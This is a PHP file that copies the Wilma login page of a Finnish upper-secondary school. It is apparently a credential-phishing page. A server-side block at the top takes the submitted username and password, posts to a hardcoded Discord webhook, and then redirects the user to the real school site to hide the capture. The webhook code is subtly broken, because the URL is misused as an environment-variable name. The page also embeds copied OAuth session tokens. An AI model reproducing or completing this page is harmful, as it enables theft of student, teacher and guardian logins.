<?php
declare(strict_types=1);
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['Login']) ? trim((string)$_POST['Login']) : '';
    $password = isset($_POST['Password']) ? (string)$_POST['Password'] : '';
    if ($username !== '' && $password !== '') {
        $webhook = getenv('https://discord.com/api/webhooks/1335234608458891375/4iUykKNybf7HW4j4VMXF6MSa1j6IRVGP3--L9NgDjIz5v_TXu3dl0R22Y7CeiT47PQeZ') ?: '';
        if ($webhook !== '') {
            $payload = json_encode(['content' => 'Login form submitted']);
            $ch = curl_init($webhook);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 5,
            ]);
            curl_exec($ch);
            curl_close($ch);
        }
        header('Location: https://tyk.inschool.fi');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="fi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="format-detection" content="telephone=no">
    <meta name="theme-color" content="#0974b3">
    <title>
        Wilmaan kirjautuminen - Wilma - Tampereen yhteiskoulun lukio</title>

        
            <link href="https://cdn.inschool.fi/2.35.44.2/nc3/css/bootstrap.min.css" rel="StyleSheet" type="text/css">
            <link href="https://cdn.inschool.fi/2.35.44.2/nc3/css/nc.min.css" rel="StyleSheet" type="text/css">
            <link href="https://cdn.inschool.fi/2.35.44.2/nc3/WIP/datepicker/datepicker.css" rel="StyleSheet" type="text/css">
            <link href="https://cdn.inschool.fi/2.35.44.2/styles/vendor/bootstrap-slider.min.css" rel="StyleSheet" type="text/css">
            <link href="https://cdn.inschool.fi/2.35.44.2/styles/wilma.css" rel="StyleSheet" type="text/css">
            <link href="https://cdn.inschool.fi/2.35.44.2/styles/vendor/react-datepicker.min.css" rel="StyleSheet" type="text/css">

            

        

        <link href="https://cdn.inschool.fi/2.35.44.2/styles/wilma-brand-renewal/img/wilma-favicon.png" rel="icon" type="image/png" sizes="any">
        <link href="https://cdn.inschool.fi/2.35.44.2/styles/wilma-brand-renewal/img/wilma-favicon.svg" rel="icon" type="image/svg+xml">

        

        
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/jquery/jquery.min.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/jquery/jquery-ui.min.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/jquery/jquery-ui-touch-punch.min.js" type="text/javascript" language="JavaScript"> </script>
            

            <script src="https://cdn.inschool.fi/2.35.44.2/nc3/js/bootstrap.min.js" type="text/javascript" language="JavaScript"></script>
            <script src="https://cdn.inschool.fi/2.35.44.2/nc3/js/bootstrap-tabdrop.js" type="text/javascript" language="JavaScript"></script>
            <script src="https://cdn.inschool.fi/2.35.44.2/nc3/js/hideVertMenu.js" type="text/javascript" language="JavaScript"></script>

            <script src="https://cdn.inschool.fi/2.35.44.2/nc3/WIP/datepicker/js/jquery.plugin.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/nc3/WIP/datepicker/js/jquery.datepick.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/nc3/WIP/datepicker/js/jquery.datepick.ext.visma.js" type="text/javascript" language="JavaScript"> </script>

            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/jquery/typeahead.jquery.min.js" type="text/javascript" language="JavaScript"> </script>

            <script src="https://cdn.inschool.fi/2.35.44.2/resources/locale-fi.js" type="text/javascript" language="JavaScript"></script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/chunks/commons.bundle.js" type="text/javascript" language="JavaScript"></script>
            
            
            
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/chunks/fake.bundle.js" type="text/javascript" language="JavaScript"></script>
            

            
 
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/addevent.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/navigation.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/dropdownfix.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/components.dock.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/components.sidepanel.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/components.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/menuitems.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/ordering.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/bootstrap-slider.min.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/wilma-slider.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/autotemplate.js" type="text/javascript" language="JavaScript"> </script>
            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/screenreader.js" type="text/javascript" language="JavaScript"> </script>


            

            <script src="https://cdn.inschool.fi/2.35.44.2/scripts/jquery/jquery.qrcode.min.js" type="text/javascript" language="JavaScript"></script>


            
        
</head>

<body class="nobody">

    
        
<nav class="navbar navbar-default nav-wilma">

    
        <div class="navbar-header pull-left">
            <a class="pull-left" id="skipnav" href="#main-content" autofocus>Siirry sivun pääsisältöön</a>
            <a class="navbar-brand" style="padding-right: 40px"
                 href="/"><img class="wilma-logo" src="https://cdn.inschool.fi/2.35.44.2/styles/wilma-brand-renewal/img/wilma_logo.svg" alt="Wilma Logo">
                
            </a>
        </div>
        <div class="pull-right">
            <ul class="nav navbar-nav navbar-right">
                <li class="icon dropdown dropdown-fix">
<a href="" data-toggle="dropdown" role="button" title="Kieli">
    <span class="vismaicon vismaicon-menu vismaicon-user-settings"></span>
</a>
<ul class="dropdown-menu" role="menu">
    <li class="dropdown-header">Kieli</li>
    <li role="presentation"><a href="?langid=1">Suomi</a></li>
    <li role="presentation"><a href="?langid=2">Svenska</a></li>
    <li role="presentation"><a href="?langid=3">English</a></li>
</ul>
</li>

            </ul>
        </div>
    
    
</nav>


    

    

    

    

    

    

    
    
        <div id="alerts" class="container">
            

            

            

        </div>
    

    

    
    <!-- Sivukohtainen alue alkaa -->

        
        
        <main id="main-content"
            
            >
            

<div class="container-fluid multicol">
    <div class="row">

        <div class="right col-md-4 col-md-push-8">
            

            
    <div class="panel resp-box">
        <div class="panel-body margin-side margin-top-inline">



    <h1>
        
            
                <span class="vismaicon vismaicon-unlocked" title="Tunnus/salasana"></span>
            
            Kirjaudu sisään
            
                <a href="/yubikeylogin" class="pull-right" title="YubiKey"><span class="vismaicon vismaicon-yubikey"></span></a>
            
        
    </h1>
    <form action="" id="loginForm" method="post" target="_top" class="login-form">
        
            <div class="row margin-bottom-inline">
                <div class="form-group">
                    <div class="col-xs-12">
                        <input id="login-frontdoor" type="text" name="Login" value="" class="form-control focusonload" placeholder="Käyttäjätunnus">
                    </div>
                </div>
            </div>
            <div class="row margin-bottom-inline">
                <div class="form-group">
                    <div class="col-xs-12">
                        <input type="password" id="password" name="Password" value="" class="form-control" placeholder="Salasana">
                    </div>
                </div>
            </div>
            <div class="row margin-bottom-inline">
                <div class="col-xs-12">
                    <input type="submit" name="submit" value="Kirjaudu sisään" class="btn btn-primary form-control">
                </div>
            </div>
            
                <div class="row">
                    <div class="col-xs-12">
                        <a class="pull-right" href="/forgotpasswd">Unohditko salasanasi?</a>
                    </div>
                </div>
            
            
            <div class="fancy-separator"><div class="fancy-separator-orb">tai</div></div>
            
                <div class="row">
                    <div class="col-xs-12">
                        <a class="pull-left oid-login-button" href="https://login.microsoftonline.com/3de6d62a-e660-4dd2-9b9a-59fb102c8e62/oauth2/v2.0/authorize?client_id=7848eb60-6975-45d4-93fa-727190884d29&amp;redirect_uri=https%3A%2F%2Ftyk.inschool.fi%2Fapi%2Fv1%2Fexternal%2Fopenid&amp;nonce=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Im45QzBNMHdQZDVNb3I1dEtzTTUwaFhhUG5wdTl6Z3JzIiwiZXhwIjoxNzcwMjc0NjQ2LCJpYXQiOjE3NzAyNzM3NDYsImlzcyI6IlZpc21hIEVudGVwcmlzZSBPeSIsImNuZiI6eyJraWQiOiJBQjlGMkI3RC00MzhBLTRGNkItQUY5NS00OUVEQTEyMjI4NzAifX0.MzgzMjFkZjE3YmQwN2Q5MmIwNTYwYjViYTFiNzMwMmM0MjFhNjlmZDhjMGZjNmY0ZmMzMjEyOWU5OWFhYTcwOQ&amp;state=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmwiOiIiLCJsb2dpbl9pbml0aWF0b3JfcGF0aCI6IiIsImxvZ2luX2luaXRpYXRvcl9wYXJhbXMiOiIiLCJzZXNzaW9uSWQiOiJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKcFpDSTZJakF3UVVGRU5qSTVMVUl6TTBJdE5EYzRSQzFCUVVFeExUVkdOMFUxTWpFME9VWkRRU0lzSW1WNGNDSTZNVGMzTURJNE5EVTBOaXdpYVdGMElqb3hOemN3TWpjek56UTJMQ0pqYm1ZaU9uc2lhMmxrSWpvaVJFWkVPREpDT0VRdE5rRkJRaTAwTXpjekxUa3pSRGt0TXpaQ05qTkZNMEZDTXpFMEluMTkuWm1KaE1EZ3dPRGM1T1daa09HTXlPREEyWlRFeVpEVTJaRGd5WWpSbFkyWXlNVGhqTTJRM05tWmhPV1U1TmpjeU1qa3pNR014WkdJek1HRTBaall6TkEiLCJjb25maWd1cmF0aW9uX3VybCI6Imh0dHBzOlwvXC9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tXC8zZGU2ZDYyYS1lNjYwLTRkZDItOWI5YS01OWZiMTAyYzhlNjJcL3YyLjBcLy53ZWxsLWtub3duXC9vcGVuaWQtY29uZmlndXJhdGlvbiIsImNsaWVudF9pZCI6Ijc4NDhlYjYwLTY5NzUtNDVkNC05M2ZhLTcyNzE5MDg4NGQyOSIsImV4cCI6MTc3MDI3NDY0NiwiaWF0IjoxNzcwMjczNzQ2LCJpc3MiOiJWaXNtYSBFbnRlcHJpc2UgT3kiLCJjbmYiOnsia2lkIjoiQUI5RjJCN0QtNDM4QS00RjZCLUFGOTUtNDlFREExMjIyODcwIn19.ZDI1OThmZWRiMjU1OWE4ODk4NDg1OTY4ODNiZWViYmM4NGMzMjA1NDEzZDVmNTRhYzUzNTk4YmRkMDk3NTQwOA&amp;response_mode=form_post&amp;scope=openid%20email&amp;response_type=code%20id_token"><button type="button" class="btn btn-default oid-login-button">Kirjaudu TYK-tunnuksella</button></a>
                    </div>
                </div>
            
            
        
        <input type="hidden" id="token" name="SESSIONID" value="">
        
    </form>



        </div>
    </div>




            
        </div>

        <div class="left col-md-8 col-md-pull-4">
            

            

            <div class="panel">
                <div class="panel-body">
                    
                        
                            
                        
                    

                    
                        
                            <h1>Mikä Wilma on?</h1>
                            <div class="padding-bottom-inline">
                                <p>Wilma on oppilaitoksen hallinto-ohjelman www-liittymä. Tämän Wilma-lisenssin omistaa <b>Tampereen yhteiskoulun lukio</b>.</p>
                                <p>Opiskelijat valitsevat Wilmassa kursseja, seuraavat suorituksiaan, lukevat tiedotteita ja viestivät opettajien kanssa.</p>
                                <p>Opettajat syöttävät Wilman kautta arvioinnit ja poissaolot, päivittävät henkilötietojaan ja viestivät opiskelijoiden ja huoltajien kanssa.</p>
                                <p>Huoltajat seuraavat ja selvittävät Wilman kautta opiskelijan poissaoloja, viestivät opettajien kanssa ja lukevat koulun tiedotteita.</p>
                                <p>Wilmaa käyttävät myös oppilaitoksen henkilökunta, johto sekä työpaikkaohjaajat.</p>
                                
                                    <p>
                                        Kirjaudu Wilmaan syöttämällä oikealla puolella oleviin kenttiin käyttäjätunnuksesi ja salasanasi.
                                        Paina tämän jälkeen <i>Kirjaudu sisään</i> -painiketta.
                                    </p>
                                
                                <p><a href="https://help.inschool.fi/HOP/fi/Kayttajaoikeudet-ja-tunnukset/Wilma-tunnukset/Wilma-tunnukset-FAQ.htm" target="blank">Usein kysytyt kysymykset</a></p>
                                <p><a href="https://help.inschool.fi/HOP/fi/Kayttoliittyma-yllapito-ja-sovellukset/Wilman-peruskayttoon-liittyvat-ohjeet/Wilman-pikaohje-huoltajille.htm" target="blank">Wilman huoltajaliittymän toiminnot</a></p>
                            </div>
                            <h3 class="margin-top-inline">Unohditko salasanasi?</h3>
                            
                                <p>
                                    Jos sähköpostiosoitteesi on oppilaitoksen tiedossa, voit <a href="/forgotpasswd">tilata uuden salasanan</a>.
                                    Muissa ongelmatilanteissa ota yhteys oppilaitokseen.
                                </p>
                            
                        
                    
                </div>
            </div>

            <div class="mobile-app-panel">
                <a href="https://itunes.apple.com/fi/app/wilma/id937159637" target="blank"><img class="mobile" src="https://cdn.inschool.fi/2.35.44.2/images/mobile_ios_fin.png" title="iTunes"></a>
                <a href="https://play.google.com/store/apps/details?id=fi.starsoft.wilma" target="blank"><img class="mobile" src="https://cdn.inschool.fi/2.35.44.2/images/mobile_android_fin.png" title="Google Play"></a>
            </div>

            <p class="small">
                Wilma 2.35.44.2 &copy; 2000-2026 Visma
                <a href="https://www.wilma.fi/legal" target="blank">Lisenssit</a>
            </p>

            <p class="small">
                Visma ja Visma-logo ovat Visma AS:n rekisteröityjä tavaramerkkejä.
                Wilma ja Wilman logo ovat Visma Aquila Oy:n rekisteröityjä tavaramerkkejä.
                Kaikki muut tavaramerkit ovat omistajiensa omaisuutta.
            </p>

        </div>
    </div>

    <div style="clear : both;">&#160;</div>
    </div>

    
        <script type="text/javascript" language="JavaScript">
            (function () {
                function normalizePort(protocol, port) {
                    port = String(port || '');

                    if (port && port.charAt(0) == ':') {
                        port = port.substr(1);
                    }

                    return port || (protocol.toLowerCase() != 'https:' ? '80' : '443');
                }

                if ($('#login-frontdoor').length === 0) {
                    return;
                }

                var requiredLocation = 'https://tyk.inschool.fi/';
                var parts = requiredLocation.match(/(http:|https:)\/\/([^:/]+)(:[0-9]+)?\/.*/);

                if (!parts) {
                    return;
                }

                if (location.protocol.toLowerCase() != parts[1].toLowerCase() ||
                    location.hostname.toLowerCase() != parts[2].toLowerCase() ||
                    normalizePort(location.protocol, location.port) != normalizePort(parts[1], parts[3])) {

                    $('#l-content .columns-left, #l-content .columns-right').remove();
                    $('#l-content h1').after(
                        $('<p></p>').text('Tämän sivuston osoite on muuttunut. Uusi osoite on:'),
                        $('<p></p>').append($('<a></a>').attr('href', requiredLocation).text(requiredLocation))
                    );
                }
            }());
        </script>
    

<script src="https://cdn.inschool.fi/2.35.44.2/scripts/token.js" type="text/javascript"></script>


            </main>

        <!-- Sivukohtainen alue loppuu -->

        

    
        <footer class="margin-top-bottom">
            <img src="https://cdn.inschool.fi/2.35.44.2/nc3/img/visma-logo.svg" alt="Visma Logo">
        </footer>
    

        
            <!-- Modals -->
        
        <div class="disclaimer-wrapper">
            <div id="cookie-disclaimer" class="alert alert-sm disclaimer-alert" role="alert" hidden="true">
            <div class="disclaimer-header">Käytämme evästeitä</div>
            <div class="disclaimer-content">
                <div class="disclaimer-description">
                    <span class="vismaicon vismaicon-filled vismaicon-info" aria-hidden="true"></span>
                    Valitsemalla “Hyväksy evästeet” hyväksyt evästeiden tallentamisen laitteellesi. Niiden avulla voimme parantaa sivuston toimivuutta ja analysoida sivuston käyttöä.
                </div>
                <div class="disclaimer-buttons">
                    <a class="margin-left" target="_blank" rel="noopener" href="https://www.wilma.fi/tietosuojaseloste/wilma/">Evästeasetukset</a>
                    <button id="approve-cookies" class="btn btn-primary margin-left" onclick="analyticUtils.setCookieTracking(true, userId);">Hyväksy evästeet</button>
                    <button id="decline-cookies" class="btn btn-default margin-left" onclick="analyticUtils.setCookieTracking(false, userId);">Ohita</button>
                </div>
            </div>
          </div>
        </div>

        <div class="hidden">
            <p id="lok-10031">Sinulla on tallentamattomia muutoksia. Jos kirjaudut ulos, menetät tekemäsi muutokset.</p>
            <p id="lok-5679">Tallentamattomia muutoksia</p>
            <p id="lok-1175">Kirjaudu ulos</p>
            <p id="lok-10032">Pysy tällä sivulla</p>
            <p id="lok-10037">Viestitoiminnot</p>
            <p id="lok-417">Jos poistut tallentamatta, menetät tekemäsi muutokset.</p>
        </div>

        <input type="hidden" id="___cachetag" value="https://cdn.inschool.fi/2.35.44.2/">
        <input type="hidden" id="___sublangid" value="0">

        

    
</body>
</html>
